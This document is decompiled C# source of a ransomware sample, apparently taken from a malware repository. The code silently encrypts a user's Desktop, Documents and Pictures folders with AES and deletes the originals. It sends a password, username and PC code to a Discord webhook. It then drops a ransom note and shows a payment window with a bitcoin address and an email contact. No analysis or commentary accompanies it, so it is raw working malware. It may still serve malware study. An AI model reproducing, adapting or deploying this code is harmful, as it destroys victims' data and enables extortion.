// Decompiled with JetBrains decompiler
// Type: main_space.Form1
// Assembly: WindowsFormsApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 357670BF-BD3F-4D78-82B0-FF866D6A7037
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Cryptor.gen-a653a4d7a1dd36b965591b6f55584ba3d73124eccc92e94ce28a71a0f0415f5a.exe

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using WindowsFormsApp1;

namespace main_space
{
  public class Form1 : Form
  {
    private const bool DELETE_ALL_ORIGINALS = true;
    private const bool ENCRYPT_DESKTOP = true;
    private const bool ENCRYPT_DOCUMENTS = true;
    private const bool ENCRYPT_PICTURES = true;
    private const string ENCRYPTED_FILE_EXTENSION = ".crypted";
    private const string ENCRYPT_PASSWORD = "";
    public string PcUsername = Environment.UserName;
    private string webhook = "https://discord.com/api/webhooks/844169330761531403/WWXtDa7VhC_erlJ7cXL0w_0tNnW0DNuXZtjazuH7VHBCdzFHSljBld4eDMZV4FA-5AdV";
    private static string ENCRYPTION_LOG = "";
    private string RANSOM_LETTER = "Your files are encrypted.\n\nIf you want to unlock them send 50$ worth of bitcoin to this address: 36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz\n\nAfter that email your transaction ID, pc code and username to: kabayaboo@protonmail.com\n\nAfter that wait for our response and we will send you your unique password and decryptor.\n\nEncrypted files:\n";
    private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
    private static int encryptedFileCount = 0;
    private Random randomID = new Random();
    private string pcIdFinal = "";
    private IContainer components;
    private Label lblCount;
    private TextBox txtBitcoinAddress;
    private Label label3;
    private Label pcCodeLabel;
    private Label usernameLabel;
    private Label label4;
    private TextBox textBox1;
    private Label label5;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.initializeForm();
      this.encryptFolderContents(this.DESKTOP_FOLDER);
      this.encryptFolderContents(this.PICTURES_FOLDER);
      this.encryptFolderContents(this.DOCUMENTS_FOLDER);
      if (Form1.encryptedFileCount > 0)
      {
        this.formatFormPostEncryption();
        this.dropRansomLetter();
      }
      else
      {
        Console.Out.WriteLine("No files to encrypt.");
        Application.Exit();
      }
    }

    private void GeneratePassowrd(string encryption_pass)
    {
      ManagementObjectCollection objectCollection = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get();
      string str1 = "";
      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = objectCollection.GetEnumerator())
      {
        if (enumerator.MoveNext())
          str1 = enumerator.Current["ProcessorId"].ToString();
      }
      Random num = new Random();
      string str2 = new string(((IEnumerable<char>) str1.ToCharArray()).OrderBy<char, bool>((Func<char, bool>) (s => num.Next(2) % 2 == 0)).ToArray<char>());
      string userName = Environment.UserName;
      Random random1 = new Random();
      string str3 = new string(((IEnumerable<char>) userName.ToCharArray()).OrderBy<char, bool>((Func<char, bool>) (s => num.Next(2) % 2 == 0)).ToArray<char>());
      string str4 = str2 + str3;
      Random random2 = new Random();
      encryption_pass = new string(((IEnumerable<char>) str4.ToCharArray()).OrderBy<char, bool>((Func<char, bool>) (s => num.Next(2) % 2 == 0)).ToArray<char>());
    }

    public static void SendWebhook(string webhook_url, string msg, string username)
    {
      WebClient webClient = new WebClient();
      try
      {
        webClient.UploadValues(webhook_url, new NameValueCollection()
        {
          {
            "content",
            msg
          },
          {
            nameof (username),
            username
          }
        });
      }
      catch (WebException ex)
      {
        Console.WriteLine(ex.Message.ToString());
      }
    }

    private void dropRansomLetter()
    {
      StreamWriter streamWriter = new StreamWriter(this.DESKTOP_FOLDER + "\\READ_ME.crypted.txt");
      streamWriter.WriteLine(this.RANSOM_LETTER);
      streamWriter.WriteLine(Form1.ENCRYPTION_LOG);
      streamWriter.Close();
    }

    private void formatFormPostEncryption()
    {
      this.Opacity = 100.0;
      this.ShowInTaskbar = true;
      this.usernameLabel.Text = "USERNAME: " + Environment.UserName;
      int num = this.randomID.Next(999999);
      this.pcCodeLabel.Text = "PC CODE: " + num.ToString();
      Settings1.Default.pcID = num.ToString();
      this.pcIdFinal = num.ToString();
    }

    private void initializeForm()
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
    }

    private void encryptFolderContents(string sDir)
    {
      string str = "";
      this.GeneratePassowrd(str);
      Settings1.Default.EncryptionPassword = str;
      Form1.SendWebhook(this.webhook, "EncryptionPassword: " + Settings1.Default.EncryptionPassword + "\nPcCode: " + Settings1.Default.pcID + "\nUserName: " + Environment.UserName, "Info Sender");
      try
      {
        foreach (string file in Directory.GetFiles(sDir))
        {
          if (!file.Contains(".crypted"))
          {
            Console.Out.WriteLine("Encrypting: " + file);
            Form1.FileEncrypt(file, str);
          }
        }
        foreach (string directory in Directory.GetDirectories(sDir))
          this.encryptFolderContents(directory);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static void FileEncrypt(string inputFile, string password)
    {
      byte[] randomSalt = Form1.GenerateRandomSalt();
      FileStream fileStream1 = new FileStream(inputFile + ".crypted", FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      byte[] salt = randomSalt;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CBC;
      fileStream1.Write(randomSalt, 0, randomSalt.Length);
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
      byte[] buffer = new byte[1048576];
      try
      {
        int count;
        while ((count = fileStream2.Read(buffer, 0, buffer.Length)) > 0)
          cryptoStream.Write(buffer, 0, count);
        fileStream2.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error: " + ex.Message);
      }
      finally
      {
        Form1.ENCRYPTION_LOG = Form1.ENCRYPTION_LOG + inputFile + "\n";
        ++Form1.encryptedFileCount;
        cryptoStream.Close();
        fileStream1.Close();
        System.IO.File.Delete(inputFile);
      }
    }

    public static byte[] GenerateRandomSalt()
    {
      byte[] data = new byte[32];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        for (int index = 0; index < 10; ++index)
          cryptoServiceProvider.GetBytes(data);
      }
      return data;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.lblCount = new Label();
      this.txtBitcoinAddress = new TextBox();
      this.label3 = new Label();
      this.pcCodeLabel = new Label();
      this.usernameLabel = new Label();
      this.label4 = new Label();
      this.textBox1 = new TextBox();
      this.label5 = new Label();
      this.SuspendLayout();
      this.lblCount.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.lblCount.Font = new Font("Microsoft Sans Serif", 27.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblCount.ForeColor = Color.White;
      this.lblCount.Location = new Point(12, 9);
      this.lblCount.Name = "lblCount";
      this.lblCount.Size = new Size(574, 55);
      this.lblCount.TabIndex = 0;
      this.lblCount.Text = "Your files are encrypted!";
      this.lblCount.TextAlign = ContentAlignment.MiddleCenter;
      this.txtBitcoinAddress.Anchor = AnchorStyles.Bottom;
      this.txtBitcoinAddress.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtBitcoinAddress.Location = new Point(14, 209);
      this.txtBitcoinAddress.Name = "txtBitcoinAddress";
      this.txtBitcoinAddress.ReadOnly = true;
      this.txtBitcoinAddress.Size = new Size(574, 31);
      this.txtBitcoinAddress.TabIndex = 3;
      this.txtBitcoinAddress.Text = "36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz";
      this.txtBitcoinAddress.TextAlign = HorizontalAlignment.Center;
      this.label3.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.label3.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.White;
      this.label3.Location = new Point(14, 64);
      this.label3.Name = "label3";
      this.label3.Size = new Size(574, 142);
      this.label3.TabIndex = 5;
      this.label3.Text = componentResourceManager.GetString("label3.Text");
      this.label3.TextAlign = ContentAlignment.TopCenter;
      this.pcCodeLabel.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.pcCodeLabel.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.pcCodeLabel.ForeColor = Color.White;
      this.pcCodeLabel.Location = new Point(9, 244);
      this.pcCodeLabel.Name = "pcCodeLabel";
      this.pcCodeLabel.Size = new Size(579, 26);
      this.pcCodeLabel.TabIndex = 6;
      this.pcCodeLabel.Text = "PC CODE: ";
      this.usernameLabel.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.usernameLabel.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.usernameLabel.ForeColor = Color.White;
      this.usernameLabel.Location = new Point(9, 270);
      this.usernameLabel.Name = "usernameLabel";
      this.usernameLabel.Size = new Size(579, 26);
      this.usernameLabel.TabIndex = 7;
      this.usernameLabel.Text = "USERNAME: ";
      this.label4.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.label4.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label4.ForeColor = Color.White;
      this.label4.Location = new Point(9, 296);
      this.label4.Name = "label4";
      this.label4.Size = new Size(579, 26);
      this.label4.TabIndex = 8;
      this.label4.Text = "After you make the payment email us at:";
      this.label4.TextAlign = ContentAlignment.MiddleCenter;
      this.textBox1.Anchor = AnchorStyles.Bottom;
      this.textBox1.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.textBox1.Location = new Point(14, 325);
      this.textBox1.Name = "textBox1";
      this.textBox1.ReadOnly = true;
      this.textBox1.Size = new Size(574, 31);
      this.textBox1.TabIndex = 9;
      this.textBox1.Text = "kabayaboo@protonmail.com";
      this.textBox1.TextAlign = HorizontalAlignment.Center;
      this.label5.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.label5.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label5.ForeColor = Color.White;
      this.label5.Location = new Point(14, 359);
      this.label5.Name = "label5";
      this.label5.Size = new Size(579, 60);
      this.label5.TabIndex = 10;
      this.label5.Text = "When you are mailing us make sure to include:\r\nPc Code, Username and bitcoin transaction id.";
      this.label5.TextAlign = ContentAlignment.MiddleCenter;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.DarkTurquoise;
      this.ClientSize = new Size(598, 475);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.usernameLabel);
      this.Controls.Add((Control) this.pcCodeLabel);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.txtBitcoinAddress);
      this.Controls.Add((Control) this.lblCount);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.Text = "Main";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
